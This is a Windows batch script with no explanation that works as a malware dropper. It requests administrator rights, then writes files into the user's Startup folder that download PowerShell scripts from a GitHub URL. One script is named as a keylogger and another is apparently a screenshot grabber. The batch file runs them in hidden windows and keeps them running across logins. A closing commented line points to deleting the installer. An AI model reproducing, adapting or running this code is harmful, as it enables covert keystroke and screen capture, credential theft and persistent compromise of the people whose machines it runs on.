@echo off

>nul 2>&1 "%SystemRoot%\system32\cacls.exe" "%SystemRoot%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process '%0' -Verb RunAs"
    exit
)

set "initialPath=%cd%"
set "startup=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"

cd /d "%startup%"

echo powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/lak200425/dododo/refs/heads/main/key.ps1' -OutFile 'keylogg.ps1'; Start-Process powershell.exe -ArgumentList '-File \"%startup%\keylogg.ps1\"' -WindowStyle Hidden" > keylogg.cmd
powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\keylogg.cmd\"' -WindowStyle Hidden"

powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/lak200425/dododo/refs/heads/main/ss.ps1', '%startup%\ss.ps1')"
powershell -Command "Start-Process powershell.exe -ArgumentList '-File \"%startup%\ss.ps1\"' -WindowStyle Hidden"

powershell -Command "Start-Process powershell.exe -ArgumentList '-File \"%startup%\keylogg.ps1\"' -WindowStyle Hidden"
powershell -Command "Start-Process powershell.exe -ArgumentList '-File \"%startup%\ss.ps1\"' -WindowStyle Hidden"

cd /d "%initialPath%"

REM del initial.cmd
